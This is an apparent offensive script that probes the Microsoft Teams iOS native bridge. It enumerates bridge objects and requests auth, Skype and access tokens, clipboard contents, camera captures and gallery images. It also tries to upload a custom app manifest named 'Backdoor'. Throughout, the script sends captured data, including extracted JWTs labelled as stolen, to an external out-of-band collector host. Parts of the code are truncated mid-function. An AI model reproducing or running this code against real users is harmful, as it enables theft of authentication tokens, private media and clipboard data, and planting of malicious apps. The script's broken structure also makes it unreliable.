<script>
var el = document.getElementById('out');
var CTX = null;
var C = 'o21c1mes8ezi4ox5wz9mmhhpikwlgcwi8.oast.site';
var BXSS = 'xss.report/c/ztlsavior';
var msgId = 1000;
var responses = {};

function log(m, cls) {
  var span = document.createElement('span');
  span.className = cls || '';
  span.textContent = m + '\n';
  el.appendChild(span);
  el.scrollTop = el.scrollHeight;
}

function ex(path, data) {
  var p = Object.keys(data).map(function(k) {
    return k + '=' + encodeURIComponent(String(data[k] || '').substring(0, 400));
  }).join('&');
  fetch('https://' + C + '/' + path + '?' + p).catch(function() {
    new Image().src = 'https://' + C + '/' + path + '?' + p;
  });
}

function copyOut() {
  navigator.clipboard.writeText(el.textContent).catch(function(){});
  log('[copied]', 'info');
}

function safStr(obj, d) {
  if (d === undefined) d = 2;
  if (d <= 0) return String(obj);
  if (obj === null) return 'null';
  if (obj === undefined) return 'undefined';
  var t = typeof obj;
  if (t === 'string') return '"' + obj.substring(0, 200) + '"';
  if (t === 'number' || t === 'boolean') return String(obj);
  if (t === 'function') return '[fn ' + (obj.name || '?') + ']';
  if (Array.isArray(obj)) return '[' + obj.slice(0,5).map(function(v){return safStr(v,d-1)}).join(',') + ']';
  if (t === 'object') {
    var k; try{k=Object.getOwnPropertyNames(obj)}catch(e){try{k=Object.keys(obj)}catch(e2){return '[obj]'}}
    return '{' + k.slice(0,15).map(function(p){try{return p+':'+safStr(obj[p],d-1)}catch(e){return p+':err'}}).join(', ') + '}';
  }
  return String(obj);
}

// ================================================================
// NATIVE BRIDGE CORE — Send message via framelessPostMessage
// This is the REAL channel Teams iOS uses internally
// ================================================================

function bridgeSend(func, args, callback) {
  var id = msgId++;
  var request = {
    id: id,
    func: func,
    args: args || [],
    timestamp: Date.now(),
    apiVersionTag: 'v2_' + func
  };

  if (callback) {
    responses[id] = callback;
  }

  // Try nativeInterface first (iOS frameless)
  if (window.nativeInterface && window.nativeInterface.framelessPostMessage) {
    try {
      window.nativeInterface.framelessPostMessage(JSON.stringify(request));
      log('  >> bridge(' + func + ') id=' + id + ' sent via nativeInterface', 'ok');
      return true;
    } catch(e) {
      log('  >> bridge(' + func + ') nativeInterface error: ' + e.message, 'fail');
    }
  }

  // Fallback: try parent postMessage
  if (window.parent && window.parent !== window) {
    try {
      window.parent.postMessage(request, '*');
      log('  >> bridge(' + func + ') id=' + id + ' sent via postMessage', 'info');
      return true;
    } catch(e) {}
  }

  log('  >> bridge(' + func + ') no transport available', 'fail');
  return false;
}

// Hook onNativeMessage to capture ALL responses from native host
var origOnNativeMessage = window.onNativeMessage;
window.onNativeMessage = function(evt) {
  var data;
  try {
    data = typeof evt === 'string' ? JSON.parse(evt) : (evt.data ? (typeof evt.data === 'string' ? JSON.parse(evt.data) : evt.data) : evt);
  } catch(e) {
    data = evt;
  }

  log('[NATIVE RESPONSE] ' + safStr(data, 3).substring(0, 500), 'crit');
  ex('t14-native-response', { data: safStr(data, 3).substring(0, 400) });

  // Route to callback if we have one
  if (data && data.id !== undefined && responses[data.id]) {
    responses[data.id](data.args || data);
    delete responses[data.id];
  }

  // Also check for tokens in response
  var str = JSON.stringify(data);
  if (str && str.indexOf('eyJ') !== -1) {
    var jwt = str.match(/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/);
    if (jwt) {
      log('*** JWT IN RESPONSE: ' + jwt[0].substring(0, 80) + '...', 'crit');
      try {
        var payload = JSON.parse(atob(jwt[0].split('.')[1].replace(/-/g,'+').replace(/_/g,'/')));
        log('  aud: ' + payload.aud + ' scp: ' + (payload.scp || 'N/A'), 'crit');
        ex('t14-jwt-stolen', { aud: payload.aud, scp: payload.scp, upn: payload.upn, token: jwt[0].substring(0, 200) });
      } catch(e) {}
    }
  }

  // Forward to original handler if exists
  if (origOnNativeMessage) origOnNativeMessage(evt);
};

// Also intercept postMessage responses
window.addEventListener('message', function(e) {
  if (e.origin === window.location.origin) return;
  log('[postMessage from ' + e.origin + '] ' + safStr(e.data, 2).substring(0, 300), 'crit');
  ex('t14-postmsg', { origin: e.origin, data: safStr(e.data, 2).substring(0, 300) });
});

// ================================================================
// NI1: ENUMERATE nativeInterface
// ================================================================
function probeNativeInterface() {
  log('\n' + '='.repeat(50), 'info');
  log('NI1: NATIVE INTERFACE ENUMERATION', 'info');
  log('='.repeat(50), 'info');

  // Check window.nativeInterface
  log('\n--- window.nativeInterface ---', 'info');
  if (window.nativeInterface) {
    log('EXISTS! typeof: ' + typeof window.nativeInterface, 'crit');
    try {
      var keys = Object.getOwnPropertyNames(window.nativeInterface);
      log('OwnPropertyNames: ' + (keys.length > 0 ? keys.join(', ') : '(empty)'), keys.length > 0 ? 'crit' : 'warn');
    } catch(e) { log('OwnPropertyNames error: ' + e.message, 'fail'); }
    try {
      var keys2 = Object.keys(window.nativeInterface);
      if (keys2.length > 0) log('Object.keys: ' + keys2.join(', '), 'crit');
    } catch(e) {}
    try {
      var proto = Object.getPrototypeOf(window.nativeInterface);
      if (proto) {
        var pkeys = Object.getOwnPropertyNames(proto);
        log('Prototype: ' + pkeys.join(', '), pkeys.length > 0 ? 'crit' : 'info');
      }
    } catch(e) {}

    // Check framelessPostMessage
    if (typeof window.nativeInterface.framelessPostMessage === 'function') {
      log('framelessPostMessage: FUNCTION EXISTS', 'crit');
      ex('t14-ni-found', { framelessPostMessage: 'true' });
    } else {
      log('framelessPostMessage: ' + typeof window.nativeInterface.framelessPostMessage, 'warn');
    }
  } else {
    log('NOT FOUND', 'fail');
  }

  // Check window.onNativeMessage
  log('\n--- window.onNativeMessage ---', 'info');
  log('typeof: ' + typeof window.onNativeMessage, window.onNativeMessage ? 'crit' : 'warn');

  // Check window.teams (found before)
  log('\n--- window.teams ---', 'info');
  if (window.teams) {
    log('EXISTS: ' + safStr(window.teams, 2), 'crit');
    if (window.teams.messageHandlers) {
      log('teams.messageHandlers: ' + safStr(window.teams.messageHandlers, 2), 'crit');
      // Try framelessPostMessage on it
      if (typeof window.teams.messageHandlers.framelessPostMessage === 'function') {
        log('teams.messageHandlers.framelessPostMessage EXISTS!', 'crit');
      }
      if (typeof window.teams.messageHandlers.postMessage === 'function') {
        log('teams.messageHandlers.postMessage EXISTS!', 'crit');
      }
    }
  }

  // Check GlobalVars equivalent
  log('\n--- SDK internal state ---', 'info');
  try {
    if (microsoftTeams._uninitialize) {
      log('_uninitialize exists (can reset SDK)', 'info');
    }
  } catch(e) {}

  // Deep scan for any object with framelessPostMessage
  log('\n--- Deep scan for bridge objects ---', 'info');
  var bridgeNames = [
    'nativeInterface', 'webkit', 'teams', 'TeamsNative',
    'microsoftTeamsNative', 'msteamsNative', 'teamsBridge',
    'nativeBridge', 'appBridge', 'hostBridge', 'mobileBridge',
  ];
  for (var bn of bridgeNames) {
    try {
      var obj = window[bn];
      if (obj && typeof obj === 'object') {
        var hasFPM = typeof obj.framelessPostMessage === 'function';
        var hasPM = typeof obj.postMessage === 'function';
        if (hasFPM || hasPM) {
          log('  window.' + bn + ': framelessPostMessage=' + hasFPM + ' postMessage=' + hasPM, 'crit');
          ex('t14-bridge-found', { name: bn, fpm: hasFPM, pm: hasPM });
        }
      }
    } catch(e) {}
  }
}

// ================================================================
// NI2: GET AUTH TOKEN VIA NATIVE BRIDGE
// If we bypass the SDK check by calling directly...
// ================================================================
function bridgeGetToken() {
  log('\n' + '='.repeat(50), 'info');
  log('NI2: AUTH TOKEN VIA NATIVE BRIDGE', 'info');
  log('='.repeat(50), 'info');

  // A) Direct bridge call to authentication.getAuthToken
  log('\n--- A: authentication.getAuthToken ---', 'info');
  bridgeSend('authentication.getAuthToken', [{ resource: 'https://graph.microsoft.com' }], function(args) {
    log('RESPONSE: ' + safStr(args, 3).substring(0, 500), 'crit');
  });

  // B) Alternative: getAuthToken with no resource
  log('\n--- B: authentication.getAuthToken (no resource) ---', 'info');
  bridgeSend('authentication.getAuthToken', [{}], function(args) {
    log('RESPONSE: ' + safStr(args, 3).substring(0, 500), 'crit');
  });

  // C) Direct internal func name
  log('\n--- C: getAuthToken (short name) ---', 'info');
  bridgeSend('getAuthToken', [], function(args) {
    log('RESPONSE: ' + safStr(args, 3).substring(0, 500), 'crit');
  });

  // D) Try getting the Skype token
  log('\n--- D: getConfigSetting (accessToken) ---', 'info');
  bridgeSend('getConfigSetting', ['accessToken'], function(args) {
    log('RESPONSE: ' + safStr(args, 3).substring(0, 500), 'crit');
  });

  // E) Skype token
  log('\n--- E: getConfigSetting (skypeToken) ---', 'info');
  bridgeSend('getConfigSetting', ['skypeToken'], function(args) {
    log('RESPONSE: ' + safStr(args, 3).substring(0, 500), 'crit');
  });

  // F) Try authentication.authenticate with our URL
  log('\n--- F: authentication.authenticate ---', 'info');
  bridgeSend('authentication.authenticate', [{
    url: 'https://' + C + '/ni2-auth-bridge?upn=' + encodeURIComponent(CTX ? CTX.user.userPrincipalName : ''),
    width: 600, height: 535
  }], function(args) {
    log('RESPONSE: ' + safStr(args, 3).substring(0, 500), 'crit');
  });
}

    log('CLIPBOARD RESPONSE: ' + safStr(args, 3).substring(0, 500), 'crit');
    ex('t14-clipboard', { data: safStr(args, 3).substring(0, 400) });
  });

  // B) Also try the web API again for comparison
  log('\n--- B: navigator.clipboard.readText ---', 'info');
  navigator.clipboard.readText().then(function(text) {

      log('WEB CLIPBOARD: ' + text.substring(0, 200), 'crit');

      log('WEB CLIPBOARD: (empty)', 'warn');

  }).catch(function(e) {
    log('WEB CLIPBOARD error: ' + e.message, 'fail');

}

function mediaTest(n) {
  log('\n' + '='.repeat(50), 'info');
  log('MD' + n + ': MEDIA TEST', 'info');
  log('='.repeat(50), 'info');

  switch(n) {
    // MD1: captureImage via bridge
    case 1:
      log('--- captureImage via bridge ---', 'info');
      bridgeSend('captureImage', [], function(args) {
        log('CAPTURE RESPONSE: ' + safStr(args, 2).substring(0, 300), 'crit');
        // args should contain base64 images
        var str = JSON.stringify(args);
        if (str && (str.indexOf('base64') !== -1 || str.indexOf('data:image') !== -1 || str.length > 1000)) {
          log('*** IMAGE DATA IN RESPONSE (' + str.length + ' chars)', 'crit');
          ex('t14-capture-image', { size: str.length, preview: str.substring(0, 300) });
        }
      });
      break;

    // MD2: selectMedia — gallery access
    case 2:
      log('--- selectMedia via bridge ---', 'info');
      bridgeSend('selectMedia', [{
        mediaType: 1, // Image
        maxMediaCount: 1,
        imageProps: { sources: [2], startMode: 1 } // Gallery source
      }], function(args) {
        log('SELECT RESPONSE: ' + safStr(args, 2).substring(0, 300), 'crit');
        var str = JSON.stringify(args);
        if (str && str.length > 500) {
          log('*** MEDIA DATA (' + str.length + ' chars)', 'crit');
          ex('t14-select-media', { size: str.length, preview: str.substring(0, 300) });
        }
      });
      break;

    // MD3: visualMedia.image.captureImages
    case 3:
      log('--- visualMedia.image.captureImages via bridge ---', 'info');
      bridgeSend('visualMedia.image.captureImages', [{ maxVisualMediaCount: 1 }], function(args) {
        log('VISUAL CAPTURE: ' + safStr(args, 2).substring(0, 300), 'crit');
      });
      break;

    // MD4: uploadCustomApp — upload malicious app manifest
    case 4:
      log('--- uploadCustomApp via bridge ---', 'info');
      // Create a minimal Teams app manifest
      var manifest = {
        "$schema": "https://developer.microsoft.com/en-us/json-schemas/teams/v1.16/MicrosoftTeams.schema.json",
        "manifestVersion": "1.16",
        "version": "1.0.0",
        "id": "00000000-0000-0000-0000-000000000001",
        "developer": { "name": "Test", "websiteUrl": "https://" + C, "privacyUrl": "https://" + C, "termsOfUseUrl": "https://" + C },
        "name": { "short": "Backdoor", "full": "Backdoor App" },
        "description": { "short": "test", "full": "test" },
        "icons": { "color": "color.png", "outline": "outline.png" },
        "accentColor": "#FFFFFF",
        "staticTabs": [{ "entityId": "home", "name": "Home", "contentUrl": "https://" + C + "/backdoor", "scopes": ["personal"] }],
        "permissions": ["identity", "messageTeamMembers"],
        "validDomains": [C]
      };
      var manifestStr = JSON.stringify(manifest);
      var manifestBlob = new Blob([manifestStr], { type: 'application/json' });

      bridgeSend('uploadCustomApp', [manifestBlob], function(args) {
        log('UPLOAD RESPONSE: ' + safStr(args, 3).substring(0, 300), 'crit');
        ex('t14-upload-app', { data: safStr(args, 3).substring(0, 400) });
      });
      break;

    // MD5: scanBarCode — camera access
    case 5:
      log('--- scanBarCode via bridge ---', 'info');
      bridgeSend('media.scanBarCode', [{ timeOutIntervalInSec: 10 }], function(args) {
        log('BARCODE RESPONSE: ' + safStr(args, 2).substring(0, 300), 'crit');
        ex('t14-barcode', { data: safStr(args, 2).substring(0, 300) });
      });
      break;
  }
}

// ================================================================
// DIALOG MESSAGE CHANNEL — tab ↔ dialog communication
// ================================================================
function dialogMsg() {
  log('\n' + '='.repeat(50), 'info');
  log('DM1: DIALOG MESSAGE CHANNEL', 'info');
  log('='.repeat(50), 'info');

  // A) messageForParent — send message FROM dialog context (we're in tab, but try anyway)
  log('\n--- A: messageForParent/messageForChild ---', 'info');
  bridgeSend('messageForParent', ['test-message-from-tab'], function(args) {
    log('messageForParent response: ' + safStr(args, 2), 'warn');
  });

  bridgeSend('messageForChild', ['test-message-for-child'], function(args) {
    log('messageForChild response: ' + safStr(args, 2), 'warn');
  });

  // B) Try to register as a dialog and receive messages meant for dialogs
  bridgeSend('tasks.startTask', [{
    url: 'https://' + C + '/dm1-dialog-bridge?upn=' + encodeURIComponent(CTX ? CTX.user.userPrincipalName : ''),
    title: 'Update',
    height: 300,
    width: 400
  }], function(args) {
    log('startTask response: ' + safStr(args, 3).substring(0, 300), 'warn');
  });
}

// ================================================================
// PERMISSIONS TEST
// ================================================================
function permTest() {
  log('\n' + '='.repeat(50), 'info');
  log('PM1: PERMISSIONS VIA BRIDGE', 'info');
  log('='.repeat(50), 'info');

  var perms = ['media', 'geolocation', 'notifications', 'openExternal', 'clipboard'];
  for (var p of perms) {
    bridgeSend('permissions.has', [p], function(args) {
      log('  has(' + p + '): ' + safStr(args, 2), args && args[0] ? 'crit' : 'info');
    });
    bridgeSend('permissions.request', [p], function(args) {
      log('  request(' + p + '): ' + safStr(args, 2), 'warn');
    });
  }
}
